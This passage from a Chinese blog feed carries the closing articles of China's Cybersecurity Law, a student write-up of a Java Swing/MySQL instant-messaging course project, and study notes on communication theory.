违反本法第四十六条规定，设立用于实施违法犯罪活动的网站、通讯群组，或者利用网络发布涉及实施违法犯罪活动的信息，尚不构成犯罪的，由公安机关处五日以下拘留，可以并处一万元以上十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处五万元以上五十万元以下罚款。关闭用于实施违法犯罪活动的网站、通讯群组。单位有前款行为的，由公安机关处十万元以上五十万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。 </p><p><strong>第六十八条</strong> 网络运营者违反本法第四十七条规定，对法律、行政法规禁止发布或者传输的信息未停止传输、采取消除等处置措施、保存有关记录的，由有关主管部门责令改正，给予警告，没收违法所得；拒不改正或者情节严重的， 处十万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。电子信息发送服务提供者、应用软件下载服务提供者，不履行本法第四十八条第二款规定的安全管理义务的，依照前款规定处罚。 </p><p><strong>第六十九条</strong> 网络运营者违反本法规定，有下列行为之一的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，对直接负责的主管人员和其他直接责任人员，处一万元以上十万元以下罚款</p><p>（一）不按照有关部门的要求对法律、行政法规禁止发布或者传输的信息，采取停止传输、消除等处置措施的； </p><p>（二）拒绝、阻碍有关部门依法实施的监督检查的； </p><p>（三）拒不向公安机关、国家安全机关提供技术支持和协助的。 </p><p><strong>第七十条</strong> 发布或者传输本法第十二条第二款和其他法律、行政法规禁止发布或者传输的信息的，依照有关法律、行政法规的规定处罚。 </p><p><strong>第七十一条</strong> 有本法规定的违法行为的，依照有关法律、行政法规的规定记入信用档案，并予以公示。 </p><p><strong>第七十二条</strong> 国家机关政务网络的运营者不履行本法规定的网络安全保护义务的，由其上级机关或者有关机关责令改正；对直接负责的主管人员和其他直接责任人员依法给予处分。 </p><p><strong>第七十三条</strong> 网信部门和有关部门违反本法第三十条规定，将在履行网络安全保护职责中获取的信息用于其他用途的，对直接负责的主管人员和其他直接责任人员依法给予处分。网信部门和有关部门的工作人员玩忽职守、滥用职权、徇私舞弊，尚不构成犯罪的，依法给予处分。 </p><p><strong>第七十四条</strong> 违反本法规定，给他人造成损害的，依法承担民事责任。违反本法规定，构成违反治安管理行为的，依法给予治安管理处罚；构成犯 罪的，依法追究刑事责任。 </p><p><strong>第七十五条</strong> 境外的机构、组织、个人从事攻击、侵入、干扰、破坏等危 害中华人民共和国的关键信息基础设施的活动，造成严重后果的，依法追究法律责任；国务院公安部门和有关部门并可以决定对该机构、组织、个人采取冻结财 产或者其他必要的制裁措施。 </p><h4 id="第七章-附-则"><a href="#第七章-附-则" class="headerlink" title="第七章 附 则"></a>第七章 附 则</h4><p><strong>第七十六条</strong> 本法下列用语的含义： </p><p>（一）网络，是指由计算机或者其他信息终端及相关设备组成的按照一定的规则和程序对信息进行收集、存储、传输、交换、处理的系统。 </p><p>（二）网络安全，是指通过采取必要措施，防范对网络的攻击、侵入、干扰、破坏和非法使用以及意外事故，使网络处于稳定可靠运行的状态，以及保障网络数据的完整性、保密性、可用性的能力。 </p><p>（三）网络运营者，是指网络的所有者、管理者和网络服务提供者。 </p><p>（四）网络数据，是指通过网络收集、存储、传输、处理和产生的各种电子数据。 </p><p>（五）个人信息，是指以电子或者其他方式记录的能够单独或者与其他信息结合识别自然人个人身份的各种信息，包括但不限于自然人的姓名、出生日期、 身份证件号码、个人生物识别信息、住址、电话号码等。 </p><p><strong>第七十七条</strong> 存储、处理涉及国家秘密信息的网络的运行安全保护，除应 当遵守本法外，还应当遵守保密法律、行政法规的规定。 </p><p><strong>第七十八条</strong> 军事网络的安全保护，由中央军事委员会另行规定。 </p><p><strong>第七十九条</strong> 本法自 2017 年 6 月 1 日起施行。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;目-录&quot;&gt;&lt;a href=&quot;#目-录&quot; class=&quot;headerlink&quot; title=&quot;目 录&quot;&gt;&lt;/a&gt;目 录&lt;/h4&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h4 id=&quot;第一章-总-则&quot;&gt;&lt;a href=&quot;#第一章-总-则&quot; class=&quot;headerlink&quot; t</summary>
      
    
    
    
    <category term="网络安全" scheme="https://shierjinghuang.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="法律法规" scheme="https://shierjinghuang.github.io/tags/%E6%B3%95%E5%BE%8B%E6%B3%95%E8%A7%84/"/>
    
  </entry>
  
  <entry>
    <title>Java项目 即时通讯系统</title>
    <link href="https://shierjinghuang.github.io/2023/03/18/Java%E5%AE%9E%E8%AE%AD/"/>
    <id>https://shierjinghuang.github.io/2023/03/18/Java%E5%AE%9E%E8%AE%AD/</id>
    <published>2023-03-18T01:25:00.000Z</published>
    <updated>2025-03-27T09:02:03.650Z</updated>
    
    <content type="html"><![CDATA[<h2 id="即时通讯系统"><a href="#即时通讯系统" class="headerlink" title="即时通讯系统"></a>即时通讯系统</h2><h3 id="1-系统概述"><a href="#1-系统概述" class="headerlink" title="1  系统概述"></a>1  系统概述</h3><blockquote><p><font color=blue>即时通讯是一款基于互联网的即时通讯软件，旨在为企业提供高效、安全、便捷的沟通工具。</font></p><p>本项目是一个基于Java语言开发的企业QQ系统，是基于C/S模型实现。系统可分为两个部分，服务端和客户端。服务端的工作主要是来监听和接收来自客户端的请求，然后存储并处理客户端发来的消息，并通知客户端。而客户端的功能是能够让新用户注册，通过用户名密码登陆并且使用该系统。通过服务端和客户端的协同工作最终使用户能够使用该程序，完成用户和用户之间的沟通。</p></blockquote><h4 id="1-1-功能概述"><a href="#1-1-功能概述" class="headerlink" title="1.1 功能概述"></a>1.1 功能概述</h4><ol><li><p>好友管理：支持用户进行好友添加、好友删除、修改等操作，同时也支持用户自行注册、登录、修改个人信息等操作</p></li><li><p>群组管理：支持用户创建、删除、修改群组，同时也支持用户加入、退出、查看群组等操作</p></li><li><p>即时通讯：支持用户之间的即时聊天，同时也支持群组内的多人聊天，聊天内容可以包括文字、图片、文件、表情等</p></li><li><p>安全性保障：所有数据传输均采用加密方式，保证用户信息和聊天内容的安全性</p></li><li><p>消息推送：支持消息推送功能，当有新消息到达时，系统会及时向用户发送通知，方便用户及时查看聊天记录</p></li><li><p>日志记录：系统会记录用户的聊天记录以及操作日志，方便管理员进行管理和监控</p></li></ol><h4 id="1-2-技术概述"><a href="#1-2-技术概述" class="headerlink" title="1.2 技术概述"></a>1.2 技术概述</h4><p><strong>1.2.1 Java基础知识：包括语法、面向对象编程</strong></p><p>Java具有简单性、面向对象、分布式、健壮性、安全性、平台独立与可移植性、多线程、多线程、动态性等特点。Java可以编写桌面应用程序、Web应用程序、分布式系统和嵌入式系统应用程序等</p><p><strong>1.2.2 网络编程技术Socket</strong></p><p>在本程序中为实现客户端和服务器之间的通信，使用Socket技术，socket能够通过java程序发出请求和处理网络发过来的请求。在建立双方网络连接的时候会使用到socket套接字。当网络成功建立连接后，双方都会有一个socket的实例被建立，通过使用和操作这个实例完成各种需求。对双方的连接来说，客户端和服务端并没有什·么差别socket是平等的，它们都是通过socket的实现类和它的子类来完成的</p><p>socket分为服务端和客户端两部分，服务端主要是可以监听一个特殊的端口，它能够监听并且捕获的向这个特定的端口发出的请求，这个请求就是由客户端来发起的。当连接建立之后会产生会话，完成会话之后关闭连接。而客户端主要是发起请求，它能够向某一个特定的服务器上的一个特殊的端口发起请求，然后建立连接处理会话，会话完成后和服务端一样关闭socket。客户端并不用像服务器一样规定一个特殊的打开的端口，系统会自动分配一个能够使用的端口</p><p><strong>1.2.3 数据库java.SQL与MySQL数据库</strong></p><p>Java.SQL是Java语言中用于访问关系型数据库的API，Java.SQL API提供了一组简单易用的接口和类来访问关系型数据库，使得开发者可以方便地进行数据库操作，Java.SQL API是面向对象的，它将数据库中的数据结构映射为Java中的对象，使得开发者可以使用面向对象的方式来操作数据库，Java.SQL API支持插件式的驱动程序架构，使得开发者可以通过添加新的驱动程序来支持更多的数据库类型</p><p>MySQL是一种开源的、关系型数据库管理系统（RDBMS），它是由瑞典MySQL AB公司开发的，现在属于Oracle公司旗下产品。MySQL广泛应用于Web应用程序的开发中，是目前使用最为广泛的关系型数据库之一。其具有高性能，可扩展性、简单易用、跨平台性、可靠性，被广泛应用于各种应用程序的开发中</p><p><strong>1.2.4 前端技术java.swing与java.awt</strong></p><p>Java Swing是一组用于创建图形用户界面（GUI）的Java类库。它提供了丰富的组件和工具，可以帮助开发人员构建跨平台的GUI应用程序。ava Swing提供了许多常用的GUI组件，例如按钮、文本框、下拉列表、表格等，还提供了一些高级组件，例如树形控件、分隔面板、标签页等。Java Swing提供了多种布局管理器，例如BorderLayout、FlowLayout、GridLayout等，可以帮助开发人员快速构建复杂的GUI界面</p><p><strong>1.2.5 系统及文件流操作java.io</strong></p><p>Java的核心库java.io提供了全面的IO接口。包括：文件读写、标准设备输出等。Java中IO是以流为基础进行输入输出的，所有数据被串行化写入输出流，或者从输入流读入。支持文件输入输出、网络输入输出、内存输入输出等多种方式，可以处理各种来源的数据</p><p><strong>1.2.6 各类型数据处理java.util</strong></p><p>Java.util是Java语言中一个重要的标准库，提供了许多常用的工具类和数据结构，用于处理各种数据类型、日期、时间、集合等问题。Java.util提供了众多的数据结构，如数组、列表、队列、栈、堆、哈希表、树、图等，可以满足不同场景下的数据存储和处理需求。此外提供了Date、Calendar、DateFormat、SimpleDateFormat等类，支持日期和时间的格式化、解析、计算和比较等操作</p><p><strong>1.2.7 java.long多线程设置</strong></p><p>java.lang包中的Thread类是Java实现多线程的核心类之一。通过创建Thread对象并调用其start()方法，可以启动一个新的线程并执行其中的代码</p><p>创建了一个新的线程后，会将其作为参数传递给Thread构造函数的Runnable对象中定义的代码块作为该线程的执行内容。调用start()方法后，该线程会在后台运行并执行其中的代码。除了Thread类，java.lang包中还提供了一些其他的类和接口，如Runnable接口、ThreadGroup类等，用于实现多线程编程。通过这些类和接口，可以方便地管理和控制多个线程的执行</p><h3 id="2-系统设计"><a href="#2-系统设计" class="headerlink" title="2  系统设计"></a>2  系统设计</h3><h4 id="2-1功能设计"><a href="#2-1功能设计" class="headerlink" title="2.1功能设计"></a>2.1功能设计</h4><p>系统功能框架如图2-1所示:</p><img src="./Java实训/系统功能框架.jpg" style="zoom: 67%;" /><center>图2-1系统功能框架</center>系统使用流程如图2-1所示：<img src="./Java实训/系统使用流程.jpg" alt="img" style="zoom:67%;" /><center>图2-2系统使用流程</center>即时通讯是一款基于互联网的即时通讯系统，系统分为两个部分服务端和客户端,实现基础的注册登录、好友管理、群组管理、即时通讯、日志记录、提供安全保障功能。<p>客户端为用户提供了注册登录功能，新用户通过注册账号进入即时通讯系统，系统自动展示好友列表窗体。用户根据需求通过用户账号、用户名的搜索实现好友添加，通过查看与设置好友信息实现对好友的备注、分类与管理；用户通过群号、群名的搜索想要加入的群聊，同时用户可以选取好友创建属于自己的群聊，根据需求修改群信息实现个性化群聊。</p><p>服务端实现了三大功能，界面显示功能、业务处理功能、数据传送功能。界面显示功能通过服务端的设置把控主窗体界面显示；业务处理功能管理对应的用户线程，顺利实现用户的注册、登录与退出，依托服务器连接数据库实现聊天业务的处理，完成信息的记录与查询；数据传送功能是即时聊天系统的核心功能，实现简单信息传输的同时，支持一定大小文件与图片的传输，同时为了增加交互的趣味性，支持表情包的传输，其余功能有待开发。</p><p><strong>2.1.1 登录界面</strong></p><ol><li><p>用户登录: 对输入用户名和密码进行验证。用户输入数据，发送到指定的客户端，由客户端与其相连的数据库进行比较</p></li><li><p>注册账号: 设置用户名、昵称、手机号、所在地、年龄、性别、密码并对信息进行存储</p></li></ol><p><strong>2.1.2 主界面</strong></p><ol><li><p>好友列表: 对好友分组实现创建、修改、删除；对好友实现修改备注、查看资料、清空聊天记录、置顶聊天等功能</p></li><li><p>群组列表: 对群组实现创建、解散、修改资料等功能</p></li><li><p>其他功能: 实现用户资料修改、查找/添加群和好友、查看群/好友申请列表/修改用户密码/退出登录等功能。</p></li></ol><p><strong>2.1.3聊天界面</strong></p><ul><li>实现消息发送、图片发送、表情发送、文件发送、截图、查看聊天记录、字体设置等功能。</li></ul><h4 id="2-2数据库设计"><a href="#2-2数据库设计" class="headerlink" title="2.2数据库设计"></a>2.2数据库设计</h4><p><strong>2.2.1 实体关系设计</strong></p><p>即时通讯系统采用的是MySQL数据库，然后借助数据库可视化软MySQL workbeach 创建数据库，通过相应建表语句，最后完整的设计出系统数据库。</p><p>系统数据库表基本E-R表关系如图2-2所示。</p><p>系统数据库实体属性如图2-3、图2-4、图2-5、图2-6所示。</p><img src="./Java实训/数据库基本E-R图.jpg" style="zoom:80%;" /><center>图2-2系统E-R图</center><img src="./Java实训/用户实体.jpg" style="zoom: 80%;" /><center>图2-3用户属性图</center><img src="./Java实训/好友属性E-R图.jpg" style="zoom:80%;" /><center>图2-4好友属性图</center><img src="./Java实训/消息属性E-R图.jpg" style="zoom:67%;" /><center>图2-5消息记录属性图</center><img src="./Java实训/群属性E-R图.jpg" style="zoom:80%;" /><center>图2-6群属性图</center>**2.2.2表**<p>以下列出数据库设计过程中相关表的情况。</p><ol><li>yonghu用户信息表 :该表主要用于存储注册用户的个人账号信息，主要由账号密码、性别、年龄、昵称、电话、地址、注册日期等字段组成，其表结构如表2-1所示。</li></ol><center>表2-1 yonghu表的结构</center>|   字段名   | 数据类型 | 长度 | 是否主键 |   描述   || :--------: | :------: | ---- | :------: | :------: || yonghuming | varchar  | 200  |    是    |  用户名  ||    mima    | varchar  | 200  |    否    |   密码   ||  xingbie   | varchar  | 200  |    否    |   性别   ||  nianling  | varchar  | 200  |    否    |   年龄   ||   aihao    | varchar  | 200  |    否    |   爱好   ||    role    | varchar  | 200  |    否    |   角色   ||  nicheng   | varchar  | 200  |    否    |   昵称   ||   phone    | varchar  | 200  |    否    |   电话   ||  address   | varchar  | 200  |    否    |   地址   ||  headimg   | varchar  | 200  |    否    |   头像   || registdate | varchar  | 200  |    否    | 注册日期 |<ol start="2"><li>haoyou好友表 :该表主要用于存储用户的好友信息并记录是否置顶，好友信息主要由好友名、好友备注、昵称、归属组ID组成，其表结构主要如表2-2所示。</li></ol><center>表2-2 haoyou表的结构</center>| 字段名           | 数据类型 | 长度 | 是否主键 | 描述       || :--------------- | :------: | :--: | :------: | :--------- || id               | varchar  | 200  |    是    | 好友ID     || haoyouyonghuming | varchar  | 200  |    否    | 好友用户名 || beizhuname       | varchar  | 200  |    否    | 备注名称   || nickname         | varchar  | 200  |    否    | 昵称       || zhiding          | varchar  | 200  |    否    | 是否置顶   || fenleiid         |   int    |  10  |    否    | 归属组ID   |<ol start="3"><li>qun 群组表 :该表主要记录创建的群的群号、群名、群主、群备注以及群头像，其表结构主要如表2-3所示</li></ol><center>表2-3 qun表的结构</center>| 字段名  | 数据类型 | 长度 | 是否主键 |  描述  || :-----: | :------: | :--: | :------: | :----: || qunhao  | varchar  | 200  |    是    |  群号  || qunming | varchar  | 200  |    否    |  群名  || qunzhu  | varchar  | 200  |    否    |  群主  ||  note   | varchar  | 200  |    否    |  备注  || headimg | varchar  | 200  |    否    | 群头像 |<ol start="4"><li>qunyonghu 群用户表 :该表主要记录群用户ID、用户名，以及归属群的群号，其表结构主要如表2-4所示。</li></ol><center>表2-4 qunyonghu表的结构</center>| 字段名     | 数据类型 | 长度 | 是否主键 | 描述     || ---------- | -------- | ---- | -------- | -------- || id         | varchar  | 200  | 是       | 群用户ID || qunhao     | varchar  | 200  | 否       | 归属群号 || yonghuming | varchar  | 200  | 否       | 用户名   |<ol start="5"><li>xiaoxijilu 消息记录表 :该表主要是消息记录流，记录消息的发送方、接收方、类型、内容、大小，其表结构主要如表2-5所示</li></ol><center>表2-5 xiaoxijilu表的结构</center>| 字段名        | 数据类型 | 长度 | 是否主键 | 描述     || ------------- | -------- | ---- | -------- | -------- || id            | varchar  | 200  | 是       | 编号     || fasongren     | varchar  | 200  | 否       | 发送方   || jieshouren    | varchar  | 200  | 否       | 接收方   || neirong       | varchar  | 200  | 否       | 消息内容 || leixing       | varchar  | 200  | 否       | 消息类型 || fasongshijian | varchar  | 200  | 否       | 发送时间 || size          | varchar  | 200  | 否       | 消息大小 |<ol start="6"><li>fenlei :该表主要记录用户的所属分组，主要包括用户名、归属分组名、归属分组的ID，其表结构主要如表2-6所示</li></ol><center>表2-6 fenlei表的结构</center>| 字段名    | 数据类型 | 长度 | 是否主键 |   描述   || --------- | :------: | :--: | :------: | :------: || id        |   int    |  10  |    是    |    ID    || parentid  |   int    |  10  |    否    | 归属组ID || mingcheng | varchar  | 200  |    否    |   组名   || username  | varchar  | 200  |    否    |  用户名  |<ol start="7"><li>qiandao :该表用于记录用户的上线日期，其表结构主要如表2-7所示</li></ol><center>表2-7 qiandao表的结构</center>|   字段名    | 数据类型 | 长度 | 是否主键 |   描述   || :---------: | :------: | :--: | :------: | :------: ||     id      | varchar  | 200  |    是    |    ID    || qiandaoren  | varchar  | 200  |    否    |  用户名  || qiandaoriqi | varchar  | 200  |    否    | 上线日期 |<h3 id="3-系统实现"><a href="#3-系统实现" class="headerlink" title="3  系统实现"></a>3  系统实现</h3><h4 id="3-1登录界面"><a href="#3-1登录界面" class="headerlink" title="3.1登录界面"></a>3.1登录界面</h4><p><strong>3.1.1用户登录</strong></p><p>用户登录界面如图3-1所示。</p><img src="./Java实训/用户登录界面.png"  /><center>图3-1用户登录界面图</center>页面由swing代码设计完成，通过swing的addMouseListener鼠标点击触发器，检测各功能的使用，当用户按下登录初始化一个消息对象，Message msg=new Message(textField.getText());并指定消息对象的类型为connect，并将消息发送给客户端，并开启线程监听服务器端发送信息。<p>在服务器端有Server.Task用于处理客户端发送的各种消息，当检查到消息类型为connect，进入登录审查，检查数据库签到表，如果表项不为空，说明当前账户已经在其他设备登录，返回该用户已登录信息，防之存储用户名对应的ip 端口，并查询数据库用户表项用户是否存在和密码是否正确。</p><p>如果账户密码匹配成功则返回信息，登录成功，反之返回登录失败，客户端会通过线程监听服务器返回的信息作出相应的反馈。</p><p><strong>3.1.2注册账号</strong></p><p>注册账号界面如图3-2所示。</p><img src="./Java实训/账号注册页面.png" style="zoom:67%;" /><center>图3-2注册账号界面图</center>与登录流程类似，当用户点击注册按钮，会初始化一个消息对象，消息对象的类型字段为regist，并通过java.sql将数据存储到用户表上，此外与登录页面类似<p>另外的，在上传头像上使用java.io库中的getSelectedFile函数，在本地计算机中选取图像与头像，头像的传输与其在数据库的存储则是这一项目中较为困难的点，我们在用户表中设有headimg用于经过计算得到的存储32位的头像散列，并将其一流的形式发到对应服务器的headimg中，在用户登录时也是对应将这里的数据流发送给客户端</p><h4 id="3-2主界面"><a href="#3-2主界面" class="headerlink" title="3.2主界面"></a>3.2主界面</h4><p>即时通讯系统主界面如图3-3所示。</p><img src="./Java实训/即时通讯系统主界面.png"  /><center>图3-3主界面</center>**3.2.1好友列表**<p>分组创建功能实现如图3-4所示，修改好友备注功能实现如图3-5所示。</p><img src="./Java实训/创建图片.png" style="zoom:80%;" /><center>图3-4分组创建</center><img src="./Java实训/修改备注.png"  /><center>图3-5修改备注</center>**3.2.2群组列表**<p>创建群功能实现如图3-6所示。</p><img src="./Java实训/群聊功能实现.jpg"  /><center>图3-6群创建</center>**3.2.3其他功能**<p>添加好友功能实现如图3-7所示，添加群聊功能实现如图3-8所示，好友申请列表如图3-9所示</p><img src="./Java实训/添加好友功能实现.png" style="zoom:80%;" /><center>图3-7添加好友</center><img src="./Java实训/入群申请.png" style="zoom:80%;" /><center>图3-8申请入群</center><img src="./Java实训/好友申请列表.png"  /><center>图3-9好友申请列表</center>#### 3.3聊天界面<p>私聊聊天界面如图3-10所示，群聊聊天界面如图3-11所示</p><img src="./Java实训/私聊界面.png" style="zoom:80%;" /><center>图3-10 私聊聊天界面</center>本项目作为一个模仿QQ设计的即时通讯软件，私聊与群聊毫无疑问是程序的核心，在聊天的功能基础上我们受课程原始项目启发，实现了原有项目未能实现的字体设计，图片发送与文件发送，及表情包。表情包的本质实际为预先存储于程序文件夹下的图片与图片传输没有本质区别，在两个客户端均省去了，使用java.io库中程序寻找文件和，发送文件流的过程。<p>截图功能作为老师所提供项目本就实现的功能，在原有基础上没有做太大改动。文件传输与图片传输与用户注册或修改用户信息时头像的传输方式类似，都是同msg流实现文件在网络中传输，发送的数据会记录到数据库中，而接受放客户端在接受到想用信息后会将msg流存储与/msg文件夹下，实现了信息的本地存储。</p><h4 id="3-4数据存储实现"><a href="#3-4数据存储实现" class="headerlink" title="3.4数据存储实现"></a>3.4数据存储实现</h4><p>数据存储结果如图3-12</p><img src="./Java实训/数据存储结果.jpg" style="zoom:80%;" /><center>图3-12 数据存储结果</center>**在数据库的实现过程中具体操作如下：**<ol><li><p>获取数据库连接：使用getConnection方法加载MySQL数据库驱动程序”jdbc:mysql://“+ip+”:3306/“+ dbname +”?characterEncoding=utf-8”, username, password,并通过getConnection()方法建立数据库连接</p></li><li><p>在代码中实现创建数据库和数据表，比如createStatement().execute()方法执行创建数据库命令及getConn() .createStatement().executeUpdate()方法实现数据表创建</p></li><li><p>对建立的数据库连接进行测试Connection对象的createStatement()方法创建Statement对象，使用Statement对象执行SQL语句，通过executeQuery()方法执行查询语句</p></li><li><p>创建对象，使用userService.save()实现将各种所需数据数据记录进数据表中</p></li></ol><h3 id="4-结论"><a href="#4-结论" class="headerlink" title="4  结论"></a>4  结论</h3><p>本项目是一个基于Java的企业QQ系统，实现了用户注册、登录、添加好友、聊天等基本功能。能够完成用户日常交流的需要。</p><p>通过本项目的实践，我们深入理解了Java语言和相关技术的应用，掌握了Swing、Java SQL、Java.util、MySQL、多线程等技术的使用，提高了自己的编码能力和项目开发经验。同时，本项目也为企业内部沟通和协作提供了一种新的方式，具有一定的实际应用价值。</p><h3 id="5-源代码"><a href="#5-源代码" class="headerlink" title="5 源代码"></a>5 源代码</h3><p>怎么说呢，在实训过程中找代码学习是非常麻烦的，这里我就直接放部分找到的材料源代码的百度网盘吧……</p><blockquote><p><font color=orange>链接：<a href="https://pan.baidu.com/s/1mk02u-x_Cp-ULR5G-zkLCA?pwd=pv7m">https://pan.baidu.com/s/1mk02u-x_Cp-ULR5G-zkLCA?pwd=pv7m</a> </font ><br><font color=orange>提取码：pv7m </font></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;即时通讯系统&quot;&gt;&lt;a href=&quot;#即时通讯系统&quot; class=&quot;headerlink&quot; title=&quot;即时通讯系统&quot;&gt;&lt;/a&gt;即时通讯系统&lt;/h2&gt;&lt;h3 id=&quot;1-系统概述&quot;&gt;&lt;a href=&quot;#1-系统概述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="项目设计" scheme="https://shierjinghuang.github.io/categories/%E9%A1%B9%E7%9B%AE%E8%AE%BE%E8%AE%A1/"/>
    
    
    <category term="Java" scheme="https://shierjinghuang.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>通信原理思考题</title>
    <link href="https://shierjinghuang.github.io/2023/03/09/%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86%E6%80%9D%E8%80%83%E9%A2%98/"/>
    <id>https://shierjinghuang.github.io/2023/03/09/%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86%E6%80%9D%E8%80%83%E9%A2%98/</id>
    <published>2023-03-09T07:25:00.000Z</published>
    <updated>2025-04-01T01:35:51.366Z</updated>
    
    <content type="html"><![CDATA[<h5 id="第一章"><strong>第一章</strong></h5><p>1-11衡量数字通信系统有效性和可靠性的性能指标有哪些?</p><blockquote><p>有效性用传输速率和频带利用率来衡量，可靠性用误码率、误信率来衡量</p></blockquote><p><font color="blue">1-12何谓是码元速率和信息速率?他们之间的关系如何?</font></p><blockquote><p>码元速率定义为单位时间里传输码元的个数，单位为波特(Baud)，信息速率定义为单位时间传输的比特数，单位是bit/s</p><p>码元速率在数值上小于等于信息速率。码元速率决定了发送信号所需的传输带宽。</p></blockquote><p>1-13何谓误码率和误信率?它们之间关系如何?</p><ul><li>误码率是指错误接收的码元数在传输总码元数中所占的比例  Pe=错误码元数/传输总码元数</li><li>误信率是指错误接收的比特数在传输总比特数中所占得比例  Pb=错误比特数/传输总比特数</li><li>它们是描述差错率的两种不同表述，在二进制中，二者数值相等</li></ul><h5 id="第二章"><strong>第二章</strong></h5><p>确知信号按照其强度可以分为能量信号和功率信号。功率信号按照其有无周期性划分，可以分为周期性信号和非周期性信号。</p><p>2-1何为确知信号?</p><blockquote><p>确知信号是指其取值在任何时间都是确定的和预知的信号</p></blockquote><p>2-2试分别说明能量信号和功率信号的特性?</p><blockquote><p>能量信号的其能量为有限的正值，但其功率等于零;功率信号其能量近似等于无穷大，其平均功率为有限值</p></blockquote><h5 id="第三章"><strong>第三章</strong></h5><p>随机过程的定义</p><p>定义一:<strong>随机过程是所有样本函数的集合</strong>，定义二:<strong>随机过程看作是在时间进程中处于不同时刻的随机变量的集合</strong></p><p>随机过程的统计特性由其分布函数或概率密度函数描述。</p><p>什么是各态历经性过程？</p><blockquote><p>随机过程中的任何一次实现都经历了随机过程的所有可能状态<font color="blue">（一个随机过程的所有样本函数都服从同一分布）</font></p></blockquote><ul><li>与平稳过程关系：具有各态历经性的过程一定是平稳随机过程，反之不一定成立</li></ul><p>3-1何谓随机过程?它具有什么特点?</p><blockquote><p>随机过程是一类随时间随机变化的过程，他不能用确切的函数来表示。特点：1是对应不同随机试验结果的时间过程的集合，2是随机变量概念的延伸</p></blockquote><p>3-3何谓严平稳?何谓广义平稳?他们之间的关系如何?</p><ul><li>严平稳:若一个随机过程的统计特性与时间起点无关，时间平移不影响其任何统计特性</li><li>广义平稳:    均值与时间无关为常数，自相关函数只与时间间隔有关</li><li><font color="blue">关系:           若一个一般随机过程是严平稳随机过程，则它一定是广义平稳随机过程，反之不一定成立。若一个高斯过程，则严平稳随机过程与广义平稳随机过程等价。</font></li></ul><p>3-4平稳过程的自相关函数有哪些性质?他与功率谱密度的关系如何?</p><pre class="line-numbers language-none"><code class="language-none">(1)平稳随机过程的自然相关函数与时间起点无关，只与时间间隔有关，而且是偶函数。(2) 平稳随机过程的功率谱密度与其自相关函数是一对傅里叶变换<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221214235304920.png" alt="image-20221214235304920" style="zoom:50%;" /> </center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221214235400829.png" alt="image-20221214235400829" style="zoom:50%;" /><p>3-5什么是高斯过程，其主要性质有哪些?</p><blockquote><p>如果随机过程的任意的n维分布均服从正态分布，则称它为正态过程或高斯过程</p></blockquote><ol><li>高斯过程的n维分布只依赖于各个随机变量的均值，方差和归一化协方差;</li><li>广义平稳的高斯过程也是严平稳;</li><li>如果高斯过程在不同时刻的取值是不相关的，那么他们也是统计独立的;</li><li>高斯过程经过线性变换后仍然是高斯过程</li></ol><p>3-12什么是白噪声?其频谱和自相关函数有什么特点?白噪声通过理想低通或理想带通滤波器后的情况如何?</p><pre class="line-numbers language-none"><code class="language-none">(1)噪声的功率谱密度在所有与频率上均为常数则称为白噪声;(2)频谱为一常数，自相关函数只在R(0)处为0 ;(3)通过理想低通或理想带通滤波器后分别变成低通白噪声或带通白噪声<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221214235802823.png" alt="image-20221214235802823" style="zoom:50%;" /></center>3-13何为高斯白噪声?它的概率密度函数、功率频谱密度如何表示?<blockquote><p>如果白噪声取值的概率密度分布服从高斯分布，则称之为高斯白噪声;其概率密度函数为高斯函数，其功率谱密度为常数</p></blockquote><p>3-13补充：什么是高斯噪声?它们各有什么特点?性质？P45</p><blockquote><p>高斯噪声:概率密度函数符合正态分布的噪声。</p></blockquote><blockquote><p>高斯噪声的特点:它的n维分布仅由各随机变量的数学期望、方差和两两之间的归一化协方差函数决定。若高斯噪声是宽平稳，则也是严平稳的。若随机变量之间互不相关，则也是统计独立的</p></blockquote><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215000148202.png" alt="image-20221215000148202" style="zoom:50%;" /> <h5 id="第四章"><strong>第四章</strong></h5><p>按照传输媒质的不同分为：无线信道（自由空间或大气层）和有线信道（明线、电缆、光纤）</p><p>无线信道按照传播方式区分，包括地波、天波和视线传播三种。</p><p>有线信道分为有线电信道和有线光信道两大类</p><p>信道的数学模型分为调制信道模型和编码信道模型两类。</p><p>香农公式？<img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215000533207.png" alt="image-20221215000533207" style="zoom:50%;" /></p><p>4-6何为多径效应?</p><blockquote><p>多径传播对信号的影响称为多径效应。多径传播指信号信号经过几条路径到达接收端，而且每条路径的长度（时延）和衰减都随着时间而变。</p></blockquote><p>4-8何谓恒参信道，何谓随参信道，他们分别对信号传输有哪些主要影响?</p><pre class="line-numbers language-none"><code class="language-none">信道特性基本上不随时间变化或者变化很慢称为恒参信道;信道特性随机变化的信道称为随参信道;（乘性干扰随机变化的信道称为随参信道；乘性干扰基本保持恒定的信道称为恒参信道）恒参信道对信号传输的影响可以完全消除,而随参信道对信号传输的影响只能在统计平均的意义下消除<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>4-9何谓加性干扰，何谓乘性干扰?</p><blockquote><p>信道中的噪声 